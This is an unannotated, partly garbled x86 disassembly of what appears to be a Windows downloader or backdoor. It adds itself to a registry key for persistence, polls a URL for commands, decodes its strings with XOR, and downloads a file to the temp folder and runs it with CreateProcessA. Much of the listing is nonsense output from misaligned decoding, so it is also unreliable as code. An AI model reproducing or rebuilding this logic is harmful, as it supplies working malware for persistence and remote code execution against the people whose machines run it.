sub_401000
push ebp
mov ebp esp
sub esp 0x20c
push ebx
push esi
mov [ ebp - 0x208 ] 0x0
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x207 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
mov [ ebp - 0x108 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x107 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
loop 0x400fe0
mov [ ebp - 0x4 ] 0x0
jne r-xdata
loope r-xdata
test eax edi
std
je r-xdata
jne r-xdata
je r-xdata
out 0xc7 al
inc ebp
cld
add [ eax ] al
add [ eax ] al
push edi
je r-xdata
add al [ eax ]
add [ ebx + 0x56 ] dl
test eax edi
push 0x104
jne r-xdata
clc
push rw-data
lea ecx [ ebp - 0x208 ]
push ecx
call sub_401ed0
jne r-xdata
lea eax [ ebp - 0x108 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
je r-xdata
in eax 0x68
add al 0x1
add [ eax ] al
lea edx [ ebp - 0x20c ]
push edx
lea eax [ ebp - 0x4 ]
jne r-xdata
add esp 0x8
je r-xdata
mov [ 0x40300c68 ] eax
add [ ebp - 0x20773 ] cl
call [ ecx - 0x18 ]
sbb [ esi ] cl
add [ eax ] al
lea edi [ ebp - 0x108 ]
or ecx 0xffffffff
xor eax eax
jne r-xdata
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x208 ]
push ecx
push 0x80000002
call [ RegCreateKeyExA@IAT ]
je r-xdata
les ecx [ ebp - 0x20b6b ]
call [ edx - 0x73 ]
inc ebp
cld
mov edx [ ebp - 0x4 ]
jne r-xdata
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
lea edx [ ebp - 0x108 ]
push edx
push 0x2
push 0x0
push rw-data
lea eax [ ebp - 0x208 ]
push eax
call sub_401ed0
add esp 0x8
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ RegSetValueExA@IAT ]
je r-xdata
and ecx [ ebp - 0x10743 ]
inc [ ebx - 0x3fcc0037 ]
pop edi
jne r-xdata
push edx
call [ RegCloseKey@IAT ]
je r-xdata
in eax 0x8b
push ebp
cld
pop esi
pop ebx
mov esp ebp
pop ebp
retn
out 0x5f al
sub_401170
push ebp
mov ebp esp
sub esp 0x410
push ebx
push esi
push edi
je r-xdata
mov [ ebp - 0x408 ] 0x0
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x407 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
push 0x0
push 0x0
jne r-xdata
loop r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jne r-xdata
push 0x0
push 0x0
push rw-data
lea eax [ ebp - 0x408 ]
push eax
call sub_401ed0
add esp 0x8
push eax
call [ InternetOpenA@IAT ]
mov [ ebp - 0x8 ] eax
je r-xdata
in al 0x6a
add [ edx ] ch
and [ eax ] al
je r-xdata
test eax edi
sti
je r-xdata
xor eax eax
jmp r-xdata
in eax 0x83
jge r-xdata
pop edi
jne r-xdata
push 0x0
push 0x80000000
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ eax ] eax
add [ eax ] al
add [ ebp + 0x7 ] dh
pop esi
pop ebx
mov esp ebp
pop ebp
retn
out 0x5f al
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
jne r-xdata
push edx
call [ InternetOpenUrlA@IAT ]
mov [ ebp - 0x40c ] eax
je r-xdata
out 0x6a eax
add [ eax ] ch
add [ eax ] al
sub [ edx ] 0x6a
add [ ebx - 0x74aef7b3 ] cl
push ebp
clc
je r-xdata
je r-xdata
jmp 0xfffffffffc34cfaf
mov [ ebp - 0x410 ] 0x0
je r-xdata
jne r-xdata
mov eax [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x410 ]
push ecx
mov edx [ ebp + 0x10 ]
sub edx 0x1
push edx
mov eax [ ebp + 0xc ]
push eax
jne r-xdata
out 0xc7 al
test eax esi
sti
xor eax eax
jmp r-xdata
jne r-xdata
push eax
call [ InternetCloseHandle@IAT ]
je r-xdata
out 0x8b al
inc ebp
clc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
jne r-xdata
mov ecx [ ebp - 0x40c ]
push ecx
call [ InternetReadFile@IAT ]
mov [ ebp - 0x4 ] eax
je r-xdata
and ecx [ ebp - 0x40f73 ]
call [ ecx - 0x75 ]
push ebp
loope r-xdata
je r-xdata
je r-xdata
out 0x83 al
jge r-xdata
adc [ ebx - 0x74adfe16 ] al
inc ebp
or al 0x50
shr cl 0xde
add [ eax ] al
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add dh ah
mov ecx [ ebp - 0x40c ]
push ecx
call [ InternetCloseHandle@IAT ]
je r-xdata
jne r-xdata
mov edx [ ebp - 0x40c ]
push edx
call [ InternetCloseHandle@IAT ]
je r-xdata
jne r-xdata
add [ ebp + 0x42 ] dh
mov edx [ ebp - 0x8 ]
jne r-xdata
jmp 0xfffffffffc34a093
mov eax [ ebp - 0x8 ]
jne r-xdata
in al 0x8b
xchg ebp eax
hlt
mov eax 0x1
jne r-xdata
push edx
call [ InternetCloseHandle@IAT ]
je r-xdata
out 0x8b al
push ebp
clc
xor eax eax
jmp r-xdata
jne r-xdata
push eax
call [ InternetCloseHandle@IAT ]
je r-xdata
out 0x8b eax
inc ebp
clc
in eax 0xb8
add [ eax ] eax
add [ eax ] al
loop r-xdata
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add ch ah
shr bl 0x43
sub_401350
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
je r-xdata
mov [ ebp - 0x408 ] 0x0
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x0
je r-xdata
jne r-xdata
loop r-xdata
mov [ ebp - 0x4 ] 0x0
jne r-xdata
clc
add [ eax ] al
add ch ah
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax edi
sti
mov [ ebp - 0x404 ] 0x0
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x403 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
je r-xdata
out 0xc7 al
inc ebp
cld
add [ eax ] al
add [ eax ] al
push rw-data
jne r-xdata
out 0xc6 eax
test esp edi
sti
lea edi [ ebp - 0x404 ]
jne r-xdata
lea eax [ ebp - 0x404 ]
push eax
call sub_401ed0
add esp 0x8
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call strstr
add esp 0x8
mov [ ebp - 0x408 ] eax
je r-xdata
in eax 0x68
pushfd
xor [ eax ] al
cmp [ ebp - 0x408 ] 0x0
jne r-xdata
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
je r-xdata
in eax 0x8d
mov ebp 0xfffffbfc
je r-xdata
xor eax eax
jmp r-xdata
clc
mov edx [ ebp - 0x408 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x408 ] edx
je r-xdata
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x20
mov eax [ ebp - 0x408 ]
push eax
call strchr
add esp 0x8
mov [ ebp - 0x40c ] eax
je r-xdata
jne r-xdata
loop r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
mov [ 0xffffffff858b206a ] eax
clc
sti
xchg ebp eax
clc
sti
je r-xdata
je r-xdata
jne r-xdata
and eax [ ebx - 0x40b43 ]
inc [ eax ]
push rw-data
jne r-xdata
xor eax eax
jmp r-xdata
jne r-xdata
lea edi [ ebp - 0x404 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
lea edx [ ebp - 0x404 ]
push edx
mov eax [ ebp - 0x40c ]
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
jne r-xdata
loop r-xdata
mov [ 0x13e9c033 ] eax
add al [ eax ]
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add dl ah
je r-xdata
je r-xdata
clc
test [ ecx ] eax
add [ eax ] al
add [ ebx - 0x40b7275 ] ah
lea ecx [ ebp - 0x404 ]
push ecx
call sub_401ed0
add esp 0x8
je r-xdata
xchg esp eax
xor [ eax ] al
mov ecx [ ebp - 0x40c ]
mov [ ecx ] 0x0
je r-xdata
jne r-xdata
xor eax eax
jmp r-xdata
jne r-xdata
lea edi [ ebp - 0x404 ]
jne r-xdata
mov [ 0xfffffffffbf48d8b ] eax
and esi [ ebx ]
shr cl 0xa4
add [ eax ] eax
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
lea edi [ ebp - 0x404 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea edx [ ebp - 0x404 ]
push edx
call sub_401ed0
add esp 0x8
push eax
mov eax [ ebp - 0x408 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea edx [ ebp - 0x404 ]
push edx
call sub_401ed0
add esp 0x8
push eax
mov eax [ ebp - 0x408 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
in eax 0x8d
mov ebp 0xfffffbfc
lea edi [ ebp - 0x404 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
lea edx [ ebp - 0x404 ]
push edx
call sub_401ed0
add esp 0x8
push eax
mov eax [ ebp - 0x408 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] 0x2
je r-xdata
jne r-xdata
je r-xdata
jmp r-xdata
and ecx [ ebx + 0x1c70c4d ]
add [ eax ] eax
add [ eax ] al
mov ecx [ ebp + 0xc ]
mov [ ecx ] 0x3
je r-xdata
jne r-xdata
lea edi [ ebp - 0x404 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov edx [ ebp - 0x408 ]
jne r-xdata
in eax 0x8b
dec ebp
or al 0xc7
add [ edx ] eax
add [ eax ] al
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add [ ebx - 0x4034273 ] ah
mov eax 0x1
jne r-xdata
mov edi [ ebp - 0x408 ]
jne r-xdata
loope r-xdata
mov [ 0xfffffffffbfcbd8d ] eax
out 0xb8 al
add [ eax ] eax
add [ eax ] al
loope r-xdata
cld
sti
dec ebp
or al 0xc7
add [ ebx ] eax
add [ eax ] al
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add cl ah
add edx ecx
push edx
call atoi
add esp 0x4
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx 0x8
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov ebp 0xfffffbf8
sub_4016c0
push ebp
mov ebp esp
sub esp 0x2fc
push ebx
push esi
push edi
je r-xdata
mov [ ebp - 0x2a8 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x2a7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
mov [ ebp - 0x114 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x113 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
clc
lea eax [ ebp - 0x2a8 ]
push eax
push 0x104
jne r-xdata
mov [ 0xfffffffffeec85c6 ] eax
push 0x104
jne r-xdata
call [ GetTempPathA@IAT ]
je r-xdata
les ecx [ ebp - 0x2a77b ]
call [ eax + 0x68 ]
add al 0x1
add [ eax ] al
mov [ ebp - 0x2b4 ] 0x0
je r-xdata
jne r-xdata
lea ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x2a8 ]
push edx
call [ GetLongPathNameA@IAT ]
je r-xdata
out 0x68 al
add al 0x1
add [ eax ] al
push 0x2f
jne r-xdata
jmp 0xfffffffffd8c9d35
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call strrchr
add esp 0x8
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
je r-xdata
out 0x6a eax
das
xor eax eax
jmp r-xdata
jne r-xdata
mov ecx [ ebp - 0x2b4 ]
add ecx 0x1
mov edi ecx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
out 0x33 al
shr cl 0x5b
add eax [ eax ]
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add dh ah
je r-xdata
lea edx [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
in al 0x8b
lea ecx [ ebp + edi * 8 - 0x1 ]
inc [ ebx - 0x674fe3f ]
je r-xdata
je r-xdata
push 0x0
push 0x0
jne r-xdata
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x2a8 ]
jne r-xdata
xor eax eax
jmp r-xdata
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
call URLDownloadToFileA
test eax eax
je r-xdata
out 0x6a al
add [ edx ] ch
push 0x2e
jne r-xdata
[ edi ]
je r-xdata
mov [ 0x41b9 ] eax
add [ ebx ] dh
ror [ ebp - 0x2a743 ] 0xff
and esi [ ebx ]
shr cl 0x20
add eax [ eax ]
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add ah al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x114 ]
push edx
call strrchr
add esp 0x8
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne r-xdata
and ebp [ edx + 0x2e ]
mov edi [ ebp - 0x2b4 ]
add edi 0x1
or ecx 0xffffffff
xor eax eax
[ edi ]
jne r-xdata
lea edi [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
sub ecx [ ebp - 0x2b8 ]
push ecx
lea eax [ ebp - 0x114 ]
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
call strncpy
add esp 0xc
je r-xdata
jne r-xdata
not ecx
add ecx 0xffffffff
mov [ ebp - 0x2b8 ] ecx
je r-xdata
les ecx [ ebx - 0x2b343 ]
inc [ ebx - 0x367cfe39 ]
push [ ebx ]
shl dl 0xae
mov [ ebp - 0x11c ] 0x0
xor edx edx
mov [ ebp - 0x11b ] edx
mov [ ebp - 0x117 ] dx
mov [ ebp - 0x115 ] dl
je r-xdata
jne r-xdata
mov [ 0xfffffffffeecbd8d ] eax
push rw-data
lea eax [ ebp - 0x11c ]
push eax
call sub_401ed0
add esp 0x8
mov edi eax
lea edx [ ebp - 0x2a8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
jne r-xdata
clc
je r-xdata
jne r-xdata
mov [ 0x4030ac68 ] eax
add [ ebp - 0x11b7b ] cl
call [ eax - 0x18 ]
xchg edx eax
add eax 0xc4830000
or [ ebx + 0x58958df8 ] cl
std
mov [ ebp - 0x1a4 ] 0x88
je r-xdata
jne r-xdata
out 0xf al
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add cl ah
push 0x0
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x114 ]
push ecx
call LZOpenFileA
mov [ ebp - 0x2b0 ] eax
je r-xdata
jne r-xdata
loope r-xdata
push 0x1001
jne r-xdata
out 0x6a al
add [ ebp - 0x1a37b ] cl
call [ eax - 0x73 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
je r-xdata
stc
test [ esi + edi * 8 - 0x1 ] ebx
dec [ eax + 0x7840f ]
add [ eax ] al
mov ecx [ ebp - 0x2ac ]
push ecx
mov edx [ ebp - 0x2b0 ]
push edx
call LZCopy
je r-xdata
jne r-xdata
lea edx [ ebp - 0x1a4 ]
push edx
lea eax [ ebp - 0x2a8 ]
push eax
call LZOpenFileA
mov [ ebp - 0x2ac ] eax
je r-xdata
in eax 0x68
add [ eax ] edx
add [ eax ] al
mov eax [ ebp - 0x2b0 ]
push eax
call LZClose
je r-xdata
jne r-xdata
loop r-xdata
mov ecx [ ebp - 0x2ac ]
push ecx
call LZClose
je r-xdata
jne r-xdata
loop r-xdata
lea edx [ ebp + edi * 8 - 0x1 ]
call [ ecx - 0x75 ]
xchg ebp eax
push eax
std
mov [ ebp - 0x2fc ] 0x0
jne r-xdata
loope r-xdata
test [ eax - 0x3 ] edx
mov [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx 0x10
xor eax eax
lea edi [ ebp - 0x2f8 ]
[ edi ]
je r-xdata
out 0xc7 al
test [ edi * 8 + 0xffff ] eax
add [ eax ] al
std
lea edx [ ebp + edi * 8 - 0x1 ]
call [ ecx - 0x18 ]
pop edx
add eax 0x840f0000
pop es
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add dh ah
mov [ ebp - 0x2fc ] 0x44
jne r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] edx
je r-xdata
out 0xc7 al
inc ebp
[ eax ] al
add [ eax ] al
mov [ ebp - 0x2d0 ] 0x1
je r-xdata
jne r-xdata
je r-xdata
and eax edi
test [ edi * 8 + 0x44ffff ] eax
add [ eax ] al
mov [ ebp - 0x2cc ] 0x0
je r-xdata
jne r-xdata
mov [ 0xfffffffffd3085c7 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x2fc ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x2a8 ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
jne r-xdata
clc
je r-xdata
je r-xdata
clc
mov eax [ ebp - 0x10 ]
push eax
call [ CloseHandle@IAT ]
je r-xdata
jne r-xdata
xor eax eax
jmp r-xdata
jne r-xdata
mov ecx [ ebp - 0xc ]
push ecx
call [ CloseHandle@IAT ]
je r-xdata
jne r-xdata
loop r-xdata
mov [ 0x4debc033 ] eax
je r-xdata
mov eax 0x1
jne r-xdata
out 0x8b al
dec ebp
hlt
add [ eax ] al
inc ebp
jne r-xdata
clc
clc
sub_401b60
push ebp
mov ebp esp
sub esp 0x350
push ebx
push esi
push edi
je r-xdata
mov [ ebp - 0x238 ] 0x0
mov ecx 0xd
xor eax eax
lea edi [ ebp - 0x237 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
mov [ ebp - 0x344 ] 0x0
jne r-xdata
clc
mov [ ebp - 0x200 ] 0x0
mov ecx 0x7f
xor eax eax
lea edi [ ebp - 0x1ff ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
jne r-xdata
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x340 ]
[ edi ]
je r-xdata
and eax edi
test [ esp + edi * 8 + 0xffff ] edi
add [ eax ] al
mov [ ebp - 0x23c ] 0x0
je r-xdata
jne r-xdata
in al 0xc6
test [ eax ] eax
mov [ ebp - 0x348 ] 0x0
je r-xdata
jne r-xdata
clc
call sub_401000
je r-xdata
jne r-xdata
mov [ 0xfffffffffcb885c7 ] eax
je r-xdata
jne r-xdata
in al 0xe8
loop r-xdata
push rw-data
lea eax [ ebp - 0x238 ]
push eax
call sub_401ed0
jne r-xdata
out 0xf al
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add cl ah
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add ah ah
push 0x200
jne r-xdata
loope r-xdata
lea ecx [ ebp - 0x344 ]
push ecx
lea edx [ ebp - 0x200 ]
push edx
call sub_401350
add esp 0x8
test eax eax
jne r-xdata
je r-xdata
loope r-xdata
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add cl ch
add esp 0x8
je r-xdata
mov ah 0x30
inc eax
add [ ebp - 0x2377b ] cl
call [ eax - 0x18 ]
xchg [ edx ] eax
add [ eax ] al
mov ecx [ ebp - 0x344 ]
mov [ ebp - 0x34c ] ecx
mov edx [ ebp - 0x34c ]
mov [ ebp - 0x350 ] edx
sub [ ebp - 0x350 ] 0x1
cmp [ ebp - 0x350 ] 0x0
je r-xdata
je r-xdata
cmp [ ebp - 0x348 ] 0x3
jle r-xdata
jne r-xdata
add [ eax ] eax
add [ eax ] al
lea ecx [ ebp - 0x200 ]
push ecx
lea edx [ ebp - 0x238 ]
push edx
call sub_401170
add esp 0xc
test eax eax
jne r-xdata
add [ edx ] al
add [ eax ] al
mov eax [ ebp - 0x348 ]
add eax 0x1
mov [ ebp - 0x348 ] eax
je r-xdata
jne r-xdata
je r-xdata
sub [ ebp - 0x350 ] 0x1
cmp [ ebp - 0x350 ] 0x0
je r-xdata
cmp [ ebp - 0x348 ] 0x3
jle r-xdata
jne r-xdata
je r-xdata
je r-xdata
out 0x83 al
mov ebp 0xfffffcb8
add edi [ esi + 0x14 ]
jmp r-xdata
jne r-xdata
out 0x8b al
test [ eax - 0x7c000004 ] edi
rol [ ecx ] 0x89
test [ eax + 0xffffffc ] edi
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add bh ah
xor eax eax
jmp r-xdata
jne r-xdata
je r-xdata
sub [ ebp - 0x350 ] 0x1
cmp [ ebp - 0x350 ] 0x0
je r-xdata
je r-xdata
je r-xdata
out 0x83 eax
mov ebp 0xfffffcb8
add edi [ esi + 0x14 ]
push 0x927c0
call [ Sleep@IAT ]
je r-xdata
jne r-xdata
xor eax eax
jmp r-xdata
jne r-xdata
out 0xe9 eax
inc ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ 0xffffffff91e9c033 ] eax
add [ eax ] al
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add dh ah
mov eax [ ebp - 0x340 ]
imul eax eax 0x927c0
push eax
call [ Sleep@IAT ]
je r-xdata
jne r-xdata
je r-xdata
jmp r-xdata
push 0x927c0
call [ Sleep@IAT ]
jne r-xdata
xor eax eax
jmp r-xdata
jne r-xdata
jmp 0x967dd1b
and esi [ ebx ]
shr cl 0xcf
add [ eax ] eax
jmp r-xdata
jne r-xdata
out 0x8b al
test eax eax
cld
lea ecx [ ebp - 0x33c ]
push ecx
call sub_4016c0
add esp 0x4
je r-xdata
jne r-xdata
je r-xdata
mov eax [ ebp - 0x348 ]
jne r-xdata
je r-xdata
out 0x68 al
shl [ edi ] 0x9
add bh bh
adc eax Sleep@IAT
in eax 0x33
shr cl 0x45
add [ eax ] eax
add [ edi ] cl
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add dh ah
push 0x927c0
call [ Sleep@IAT ]
jne r-xdata
and ecx [ ebp - 0x33b73 ]
call [ ecx - 0x18 ]
cwde
clc
jmp r-xdata
jne r-xdata
jmp r-xdata
jne r-xdata
mov [ 0xfffffffffcb8858b ] eax
jne r-xdata
je r-xdata
in eax 0x68
shl [ edi ] 0x9
add bh bh
adc eax Sleep@IAT
in eax 0xe9
leave
std
loope r-xdata
jmp 0x47a263
add eax 0x1
mov [ ebp - 0x348 ] eax
je r-xdata
mov ecx 0xffffffe
test [ edi ] al
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add ch ah
_start
push ebp
mov ebp esp
push ebx
push esi
push edi
je r-xdata
push 0x1
call [ GetCommandLineA@IAT ]
push eax
push 0x0
push 0x0
call [ GetModuleHandleA@IAT ]
push eax
call sub_401b60
push eax
call [ ExitProcess@IAT ]
jne r-xdata
jmp 0x163f2001
sub_401ed0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
je r-xdata
mov eax [ ebp + 0xc ]
movsx ecx [ eax ]
mov [ ebp - 0xc ] ecx
jne r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0xc ]
movsx eax [ edx + 0x1 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
je r-xdata
jne r-xdata
loope r-xdata
mov [ ebp - 0x8 ] 0x0
jne r-xdata
loop r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
je r-xdata
inc ebp
or al 0xf
mov esi 0xf44d8908
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
jmp r-xdata
in eax 0xc7
inc ebp
clc
add [ eax ] al
add [ eax ] al
pop es
add [ eax ] al
add [ edi ] cl
test [ ecx ] eax
add [ eax ] al
add cl ch
push 0x1
call [ GetCommandLineA@IAT ]
push eax
push 0x0
push 0x0
call [ GetModuleHandleA@IAT ]
push eax
call sub_401b60
push eax
call [ ExitProcess@IAT ]
push ebp
or al 0x3
push ebp
hlt
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
jne r-xdata
mov [ eax ] 0x0
je r-xdata
out 0x8b al
inc ebp
or [ ebx ] al
inc ebp
clc
jmp r-xdata
jne r-xdata
movsx ecx [ eax + 0x1 ]
xor ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
mov [ edx ] cl
je r-xdata
les ecx [ ebx + 0x45030c45 ]
clc
pop ebx
mov esp ebp
pop ebp
retn
in al 0x8b
inc ebp
or [ edi + 0x5e ] bl
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
clc
LZClose
jmp [ LZClose@IAT ]
LZCopy
jmp [ LZCopy@IAT ]
LZOpenFileA
jmp [ LZOpenFileA@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
atoi
jmp [ atoi@IAT ]
strncmp
jmp [ strncmp@IAT ]
strchr
jmp [ strchr@IAT ]
strstr
jmp [ strstr@IAT ]
strncpy
jmp [ strncpy@IAT ]
strrchr
jmp [ strrchr@IAT ]
